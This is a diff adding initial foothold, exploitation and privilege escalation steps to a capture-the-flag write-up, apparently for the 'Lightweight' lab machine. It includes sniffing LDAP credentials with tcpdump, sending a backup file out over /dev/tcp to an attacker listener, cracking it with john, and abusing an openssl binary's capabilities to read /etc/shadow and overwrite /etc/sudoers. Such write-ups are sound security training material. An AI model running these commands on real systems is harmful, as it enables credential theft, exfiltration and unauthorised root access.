@@ -72,10 +72,120 @@
 
 # ${{\color{purple}Initial Foothold}}\ $
 
+### As user i runed linenum in the box :
 
+![image](https://user-images.githubusercontent.com/123066149/230074213-b79819d4-48e0-4325-963e-07bf4ab215ab.png)
+
+``ssh 10.10.16.2@10.10.10.119 "/usr/sbin/tcpdump -i ens160 -U -s0 -w - 'not port 22'" > lightweight.ens160.cap``
+
+``wireshark lightweight.ens160.cap``
+
+### Nothing on interface ens160 :
+
+![image](https://user-images.githubusercontent.com/123066149/230074580-5d9af87f-8846-4993-9a15-cbc95f6a9414.png)
+
+``ssh 10.10.16.2@10.10.10.119 "/usr/sbin/tcpdump -i lo -U -s0 -w - 'not port 22'" > lightweight.lo.cap ``
+
+``wireshark lightweight.lo.cap``
+
+![image](https://user-images.githubusercontent.com/123066149/230075967-16cef65c-3d3f-46c4-9d91-2ef92992c50e.png)
+
+### Generate trafic to test :
+
+![image](https://user-images.githubusercontent.com/123066149/230076081-4fd54c29-576e-4409-afa7-1066531865e7.png)
+
+![image](https://user-images.githubusercontent.com/123066149/230076128-ccdca04f-b685-4eea-8f6f-74c1db522194.png)
+
+### After reloading all the web page we have ldap trafic :
+
+![image](https://user-images.githubusercontent.com/123066149/230076579-3faf5046-3cf8-4c8e-ae72-1d4d7406bb5b.png)
+
+### Follow TCP Stream and we have ldapuser2 creds :
+
+![image](https://user-images.githubusercontent.com/123066149/230076822-b47fcea8-ff60-4951-aacd-23db87c79d1a.png)
+
+### I used the user 127.0.0.1 because 10.10.16.2 was not on sudoer file :
+
+![image](https://user-images.githubusercontent.com/123066149/230079555-c007692e-ac97-4bc5-91b7-e063db60d68c.png)
 
 # ${{\color{purple}Exploitation}}\ $
+
+### We have backup.7z file on ldapuser2 desktop :
+### File transfert without netcat :
+
+``cat backup.7z > /dev/tcp/10.10.16.2/9001``
+
+``nc -nlvp 9001 > backup.7z``
+
+![image](https://user-images.githubusercontent.com/123066149/230080710-3ed3055d-033f-4401-9b1d-81ffc1991cfb.png)
+
+### When i try 7z2john i have this error :
+
+``7z2john backup.7z``
+
+![image](https://user-images.githubusercontent.com/123066149/230080964-32cce931-2a5d-4532-93ac-50c999d8f91e.png)
+
+### Install this for fixing the error message :
+
+``apt install libcompress-raw-lzma-perl``
+
+![image](https://user-images.githubusercontent.com/123066149/230081367-276d2b76-0aa0-45d1-8bb6-cab216feb8f1.png)
+
+![image](https://user-images.githubusercontent.com/123066149/230083698-1b992505-7fd3-461c-b671-141b1abcc727.png)
+
+``john backuphash.txt --wordlist=/usr/share/wordlists/rockyou.txt``
+
+![image](https://user-images.githubusercontent.com/123066149/230083829-436f7b3e-ea80-46f3-b32a-38a4b4b7a8cf.png)
+
+ ``7z x backup.7z``
+ 
+ ![image](https://user-images.githubusercontent.com/123066149/230084395-bdb56dba-4309-4637-88dc-4144223609f4.png)
+
+### In the status.php file we have ldapuser1 creds :
+
+![image](https://user-images.githubusercontent.com/123066149/230084755-21f15dc7-35b9-4b66-9bbf-4d34ac3dc043.png)
+
+ ``su - ldapuser1``
+ 
+ ![image](https://user-images.githubusercontent.com/123066149/230094644-0b6e29e0-9115-4308-a4bd-bcce86bd09db.png)
  
 # ${{\color{purple}Privilege Escalation}}\ $
+
+![image](https://user-images.githubusercontent.com/123066149/230097354-bfead45a-4da0-44d6-8ec0-c9908e221ea0.png)
+
+``getcap *``
+
+### ep = all acpability cela permet d'effectuer l'elevation des privilèges :
+
+![image](https://user-images.githubusercontent.com/123066149/230096352-9df56fed-6be5-4290-a48e-32a591a19815.png)
+
+``man capabilites``
+
+![image](https://user-images.githubusercontent.com/123066149/230097488-fbb14914-e109-4482-9bd1-2c3e8d520ef3.png)
+
+![image](https://user-images.githubusercontent.com/123066149/230097825-d97dea8e-e609-425c-b470-1acde7f6ec08.png)
+
+``./openssl enc -in /etc/shadow``
+
+![image](https://user-images.githubusercontent.com/123066149/230098099-85b70a6f-a841-4739-b05f-f8b5b5985d59.png)
+
+``./openssl enc -in /etc/sudoers > sudoers``
+
+![image](https://user-images.githubusercontent.com/123066149/230098782-293ab9dc-8202-4a0b-a847-bc9800c3b69f.png)
+
+### Edit the sudoers file with vi or nano :
+
+![image](https://user-images.githubusercontent.com/123066149/230099786-d8d76c62-2d2c-4ae3-8f38-bc43b65b140b.png)
+
+### Cat the file and put the file in /etc/sudoers :
+
+ ``cat ./sudoers | ./openssl enc -out /etc/sudoers``
+ 
+ ![image](https://user-images.githubusercontent.com/123066149/230100637-bf027fd7-3562-4216-8639-46cdcef8257c.png)
+
+ ``sudo su``
+ 
+ ![image](https://user-images.githubusercontent.com/123066149/230100868-6a831a4e-8df6-4d08-9708-33e2493c0b8a.png)
+
  
 # ${{\color{purple}Points of Improvement}}\ $
